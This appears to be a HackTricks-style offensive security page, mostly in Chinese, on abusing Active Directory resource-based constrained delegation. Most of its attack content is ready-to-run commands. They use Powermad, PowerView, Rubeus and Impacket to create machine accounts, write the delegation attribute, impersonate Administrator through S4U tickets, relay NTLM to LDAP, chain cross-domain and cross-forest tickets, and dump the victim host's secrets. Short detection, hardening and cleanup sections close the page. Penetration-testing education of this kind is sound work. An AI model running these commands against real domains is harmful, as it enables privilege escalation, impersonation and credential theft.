# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation 基础

Resource-based constrained delegation (RBCD) 与 [constrained delegation](constrained-delegation.md) 类似，但信任方向相反。传统 constrained delegation 记录某个 principal 可以委派到哪些 services；RBCD 则记录在 **target resource** 上，指定哪些 principals 可以代表用户向其进行 impersonate。<sup>[[12]](#references)</sup>

target object 的 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ attribute 包含一个 security descriptor，用于标识允许代表其他 identities 对该 resource 执行操作的 principals。

另一个重要区别是，拥有对 **machine account** 足够**写权限**（`GenericAll`、`GenericWrite`、`WriteDacl`、`WriteProperty` 以及类似权限）的 principal，可能能够设置 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_。配置传统 constrained delegation 通常需要更高权限的 administrative access。<sup>[[1]](#references)</sup>

更准确地说，修改 classic constrained-delegation 设置通常受 domain controller 上的 `SeEnableDelegationPrivilege` 限制，该权限通常由高权限 administrators 持有。RBCD 将决策转移到 target object 的 security descriptor，因此对相关 computer-object property 的写权限可能已经足够，无需拥有该 user right。<sup>[[1]](#references)[[2]](#references)</sup>

### 新概念

`userAccountControl` 中的 **`TrustedToAuthForDelegation`** flag 通常被描述为 **S4U2Self** 的前提条件，但这并不完整。\
拥有 SPN 的 service principal 无需该 flag 也可以请求 S4U2Self。启用 `TrustedToAuthForDelegation` 时，返回的 service ticket 是 **forwardable** 的；未启用时，该 ticket 通常是 **non-forwardable** 的。<sup>[[5]](#references)</sup>

传统 constrained delegation 会在 S4U2Proxy 阶段拒绝 **non-forwardable TGS**。如果 target 的 security descriptor 授权请求该 service，RBCD 则可以接受该 S4U2Self ticket。<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Attack structure

> 如果你拥有对某个 **computer account** 的**等效写权限**，就可能获得对该 machine 的 privileged access。

假设攻击者已经拥有对 **victim computer object** 的**等效写权限**。

1. 攻击者 **compromises** 一个带有 **SPN** 的 account，或**创建一个** account（“Service A”）。默认情况下，经过认证的 domain user 最多可以创建 10 个 computer objects，具体由 **_MachineAccountQuota_** 控制；computer object 会自动提供可用的 SPNs。
2. 攻击者 **abuses its WRITE privilege** over the victim computer (ServiceB)，配置 **resource-based constrained delegation**，允许 ServiceA 代表任意 user 对该 victim computer (ServiceB) 进行 impersonate。
3. 攻击者使用 Rubeus 从 Service A 向 Service B 执行**完整的 S4U attack**（S4U2Self 和 S4U2Proxy），目标是一个**对 Service B 拥有 privileged access 的 user**。
1. S4U2Self（来自 compromised 或 created 的 SPN account）：请求一个**代表 Administrator、目标为 Service A 的 TGS**（non-forwardable）。
2. S4U2Proxy：使用该 **non-forwardable TGS** 请求一个代表 **Administrator**、目标为 **victim host** 的 service ticket。
3. 在该 RBCD flow 中，non-forwardable ticket 仍然可以正常工作，因为 Service A 已在 target resource 的 security descriptor 中获得授权。
4. 攻击者可以执行 **pass-the-ticket** 并 **impersonate** 该 user，从而获得对 victim ServiceB 的 **access**。<sup>[[1]](#references)</sup>

要检查 domain 的 _**MachineAccountQuota**_，可以使用：
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻击

### 创建计算机对象

你可以使用 **[powermad](https://github.com/Kevin-Robertson/Powermad)：**<sup>[[3]](#references)[[4]](#references)</sup> 在域内创建计算机对象。
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### 配置 Resource-based Constrained Delegation

**使用 Active Directory PowerShell module**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**使用 PowerView**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 执行完整的 S4U attack（Windows/Rubeus）

首先，我们使用密码 `123456` 创建了新的 Computer object，因此需要获取该密码的 hash：<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
这将打印该账户的 RC4 和 AES 哈希值。\  
现在，可以执行攻击：<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
你可以通过 Rubeus 的 `/altservice` 参数，只请求一次就为更多服务生成更多票据：
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> 用户可以被标记为 **"Account is sensitive and cannot be delegated."** 如果启用该标志，则无法通过此委派流程冒充该账户。BloodHound 会在分析期间显示此属性。

### Linux 工具：使用 Impacket 实现端到端 RBCD（2024+）

如果你从 Linux 环境操作，可以使用官方 Impacket 工具完成完整的 RBCD 链：<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
说明
- 如果强制启用 LDAP signing/LDAPS，请使用 `impacket-rbcd -use-ldaps ...`。
- 优先使用 AES 密钥；许多现代域会限制 RC4。Impacket 和 Rubeus 都支持仅使用 AES 的流程。
- Impacket 可以为某些工具重写 `sname`（"AnySPN"），但应尽可能获取正确的 SPN（例如 CIFS/LDAP/HTTP/HOST/MSSQLSvc）。

## 跨域与跨森林 RBCD

如果你控制的**委派主体**位于与**资源计算机**不同的域（甚至不同的森林）中，滥用方式仍然是 **RBCD**，但票据流程不再是通常的单域 `S4U2Self -> S4U2Proxy`。

### 跨域 RBCD：通过 SID 配置外部主体

当你从**不同域**设置 `msDS-AllowedToActOnBehalfOfOtherIdentity` 时，目标域 LDAP 可能**无法按名称解析外部计算机/用户**。在这种情况下，请使用外部主体的 **SID** 配置委派条目，而不是使用其 sAMAccountName/UPN。

当通过 `ntlmrelayx.py` 将 NTLM relay 到 LDAP 时，这一点尤其重要：<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes:
- `--sid` 告诉 `ntlmrelayx.py` 将 `--escalate-user` 视为 SID；当 delegating account 属于目标 domain 外部时，这是必需的。
- 即使工具输出 `User not found in LDAP`，delegation write 仍可能成功，因为 security descriptor 会直接存储 foreign SID。

### Cross-domain RBCD：cross-realm S4U sequence

当 foreign principal 位于 `msDS-AllowedToActOnBehalfOfOtherIdentity` 中后，可行的 cross-domain 流程如下：<sup>[[9]](#references)[[13]](#references)</sup>

1. 从其自身 domain 获取 delegating principal 的 **TGT**。
2. 请求 `krbtgt/<target-domain>` 的 **referral TGT**。
3. 在 target-domain DC 上，为被 impersonate 的用户请求 **cross-realm S4U2Self referral**。
4. 返回 delegator domain，为该用户请求实际的 **S4U2Self** ticket。
5. 在 delegator domain 中执行 **S4U2Proxy**，获取指向 target domain 的 referral ticket。
6. 在 target-domain DC 上执行最终的 **S4U2Proxy**，获取 `cifs/host.target`、`host/host.target` 等 service ticket。

这就是 stock Linux tooling 经常在 cross-domain RBCD 中失败的原因：<sup>[[9]](#references)</sup>
- 请求的 **realm** 可能需要与 `TGS-REQ` 中使用的 TGT 所属 realm 不同
- 该链需要**独立的 S4U2Proxy 步骤**，而不能只执行 **S4U2Self**，或执行 **S4U2Self** 后立即执行单个 **S4U2Proxy**

### Cross-domain RBCD from Linux

Synacktiv 发布了一个 Impacket `getST.py` 实现，通过显式处理两个 KDC，在 Linux 上复现 cross-realm sequence：<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
在操作上，新增的参数为：
- `-dc-ip`：**delegating** domain 的 DC
- `-targetdomain`：**resource computer** 所属的 domain
- `-targetdc`：**resource** domain 的 DC

### Cross-forest RBCD limitations

Cross-forest RBCD 有一个重要限制：**被冒充的用户必须属于与 delegating principal 相同的 forest**。换句话说，如果你控制的 machine account 位于 `valhalla.local`，而目标 resource 位于 `asgard.local`，通常**无法**通过 RBCD 冒充任意 `asgard.local` 用户访问该 resource。<sup>[[9]](#references)</sup>

在以下情况下仍然可以利用：
- **delegating forest** 中的用户是另一个 forest 的 resource host 上的 **local admin**（或拥有其他特权）
- trust 允许所需的 authentication path，且目标 computer 的 security descriptor 接受该 foreign SID

### Cross-forest RBCD protocol quirks

Cross-forest RBCD 不只是“cross-domain 加上 trust”。观察到的流程包含两个常见 tooling 历来会遗漏的 quirks：<sup>[[9]](#references)</sup>

1. 一个额外的 **S4U2Proxy** 请求，用于设置 **`PA-PAC-OPTIONS=branch-aware`**
2. 最终的 service ticket 可能会使用 **RC4** 返回，即使请求了其他 etypes

实际流程如下：

1. 在 forest A 中为 delegating principal 获取 TGT。
2. 在 forest A 中为被冒充的用户请求 **S4U2Self**。
3. 在 forest A 中请求 **S4U2Proxy**，以获取 forest B 的 referral TGT。
4. 在 forest A 中发送第二个 **S4U2Proxy**，**不**将 S4U2Self ticket 作为 additional ticket，同时启用 `branch-aware`，以获取 forest B 的另一个 referral TGT。
5. 可选：在 forest B 中为 delegating principal 请求普通 service ticket（最终 abuse 不需要此 ticket）。
6. 使用步骤 3 和 4 中的 referral tickets，在 forest B 中为被冒充的 forest-A 用户请求访问目标 SPN 的最终 **S4U2Proxy** ticket。

### Cross-forest RBCD from Linux

相同的 Synacktiv Impacket branch 为此逻辑添加了 `-forest` switch：<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### 递归多域 RBCD（3+ 个域）

在**多域 forest**中，**S4U2Self**和**S4U2Proxy**都可以进行**递归**，而不是在一次 referral 后停止：

- **递归 S4U2Self**：第一个 `S4U2Self` 会发送到**被冒充用户所在的域**，中间的父/子域跳转通过针对 `krbtgt/<REALM>` 的普通 `TGS-REQ` referral 完成，最后的 **S4U2Self** 会发送到**delegating principal 自身所在的域**。
- 这意味着，**仅持有**一个 machine account 的 **TGT**，就可能足以冒充同一 forest 中另一个域的 admin，并请求 `cifs/host`、`host/host`、`wsman/host` 等。
- **递归 S4U2Proxy** 以相同方式沿 trust chain 执行：中间跳转会在请求下一个 `krbtgt/<REALM>` referral 时，将前一个 ticket 复用为 TGT，只有最后一跳会返回最终的 service ticket。<sup>[[10]](#references)</sup>

一个实际的同一 forest 示例是：
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### 无 SPN 的跨域 / 跨林 RBCD

如果 **委派主体是没有 SPN 的用户**，最后一次递归 `S4U2Self` 会失败，并返回 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**。解决方法是**仅将最后一跳重试为 `S4U2Self+U2U`**。<sup>[[10]](#references)</sup>

滥用链简要步骤：

1. 使用 **NT hash** 进行身份验证，使 KDC 倾向于使用 **RC4-HMAC (etype 23)**。
2. 首先请求 **`-self -u2u`**，并将该票据与后续的代理步骤分开保存。
3. 使用 `describeTicket.py` 提取 **TGT 会话密钥**。
4. 使用 `changepasswd.py -newhashes <session_key>` 将用户的 **NT hash** 替换为该**会话密钥**。
5. 在单独的 **`-proxy`** 请求期间，将 `S4U2Self+U2U` 票据作为 **`-additional-ticket`** 重用。
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
操作注意事项：

- 当**第一个受信任跃点已经是另一个 forest**时，优先使用**感知分支**的算法（`getST.py ... -forest`），以匹配原生 Windows 行为。如果 foreign forest 只在链中的**后续阶段**到达，则不感知分支的递归流程仍可能正常工作。<sup>[[9]](#references)</sup>
- 在较新的 **Windows Server 2022/2025** DC 上，强制使用 RC4 可能因 RC4 已弃用而失败，并出现 **`KDC_ERR_ETYPE_NOSUPP`**；这可能导致 **无 SPN 的 RBCD** 无法执行，即使经典的基于 SPN 的 RBCD 仍可通过 AES 正常工作。<sup>[[15]](#references)</sup>
- 在更改用户的 hash/password 之前运行 **`S4U2Self+U2U`**：`SamrChangePasswordUser` **不会重新计算账户的 Kerberos AES 密钥**，因此先更改 password 可能导致后续 ticket 请求失败。<sup>[[14]](#references)</sup>
- 被 impersonate 的账户必须仍然**允许 delegation**：**Protected Users** 以及设置了 **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** 的账户会阻断该链。

## Detection / hardening notes

- 跨域/跨 forest 的 RBCD 路径通常仍通过 **ACL abuse** 或 **relay-to-LDAP** 创建。在 DC 上强制执行 **LDAP signing** 和 **LDAP channel binding**，以阻断常见的 setup 路径。
- Audit 哪些主体可以在 computer objects 上写入 `msDS-AllowedToActOnBehalfOfOtherIdentity`，并解析其中存储的 SIDs，包括 **foreign security principals**。
- 在高度依赖 trust 的环境中，检查 **Selective Authentication**、**SID filtering**，以及来自 foreign forest 的用户是否在 resource hosts 上拥有 **local admin** 权限。

### 访问

最后一条命令行将执行**完整的 S4U attack，并在内存中注入 TGS**，使 Administrator impersonate victim host。\
在此示例中，请求的是 Administrator 访问 **CIFS** service 的 TGS，因此你将能够访问 **C$**：
```bash
ls \\victim.domain.local\C$
```
### 滥用不同的 service tickets

了解[**此处可用的 service tickets**](silver-ticket.md#available-services)。

## 枚举、审计和清理

### 枚举已配置 RBCD 的计算机

PowerShell（解码 SD 以解析 SIDs）：
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket（使用一条命令读取或刷新）：
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### 清理 / 重置 RBCD

- PowerShell（清除属性）：
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos 错误

- **`KDC_ERR_ETYPE_NOTSUPP`**：这意味着 Kerberos 已配置为不使用 DES 或 RC4，而你只提供了 RC4 hash。至少向 Rubeus 提供 AES256 hash（或者直接提供 rc4、aes128 和 aes256 hash）。示例：`[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- 对普通用户执行 `-self` 时出现 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**：委派 principal 可能**没有 SPN**。将**最后一跳**重试为 **`S4U2Self+U2U`**，而不是常规的 **`S4U2Self`**。<sup>[[10]](#references)</sup>
- 执行 **无 SPN 的 RBCD** 时出现 **`KDC_ERR_ETYPE_NOSUPP`**：近期的 DC 可能会拒绝 **`S4U2Self+U2U` + session-key-substitution** 技巧所需的强制 **RC4-HMAC** 路径。改为尝试使用 AES 的经典**基于 SPN 的** RBCD 路径。<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**：这意味着当前计算机的时间与 DC 的时间不同，因此 Kerberos 无法正常工作。
- **`preauth_failed`**：这意味着给定的用户名和 hash 无法用于登录。生成 hash 时可能忘记在用户名中加入 `$`（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**：这可能意味着：
- 你尝试 impersonate 的用户无法访问所需服务（因为你无法 impersonate 该用户，或者该用户没有足够的权限）
- 请求的服务不存在（例如请求 winrm 的 ticket，但 winrm 并未运行）
- 创建的 fakecomputer 已失去对存在漏洞的服务器的权限，你需要重新授予这些权限。
- 你正在滥用经典 KCD；请记住，RBCD 可使用不可转发的 S4U2Self ticket，而 KCD 要求使用可转发的 ticket。

## Notes、relays 和 alternatives

- 如果 LDAP 被过滤，也可以通过 Active Directory Web Services（ADWS）写入 RBCD SD。参见：


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chains 通常会以 RBCD 结束，从而一步实现本地 SYSTEM。参见实际的端到端示例：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- 如果 LDAP signing/channel binding **未启用**，并且你可以创建 machine account，那么 **KrbRelayUp** 等工具可以将被 coercion 的 Kerberos auth relay 到 LDAP，为目标 computer object 上的 machine account 设置 `msDS-AllowedToActOnBehalfOfOtherIdentity`，然后通过 off-host 的 S4U 立即 impersonate **Administrator**。<sup>[[8]](#references)</sup>

## References

- [1] [滥用基于资源的受限委派攻击 Active Directory：Wagging the Dog](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [关于委派的另一番说法 – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos 基于资源的受限委派：计算机对象接管](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – 基于资源的受限委派滥用](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity 终结域：攻击性 Kerberos 概览](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py（官方）](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [包含近期语法的快速 Linux cheatsheet](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno（关闭 LDAP signing → Kerberos relay 到 RBCD）](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - 探索跨域和跨林 RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - 探索跨域和跨林 RBCD：第 2 部分](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket 分支 - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos 受限委派概览](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - 跨域 S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - 检测并修复 Kerberos 中的 RC4 使用](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy 详细信息](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
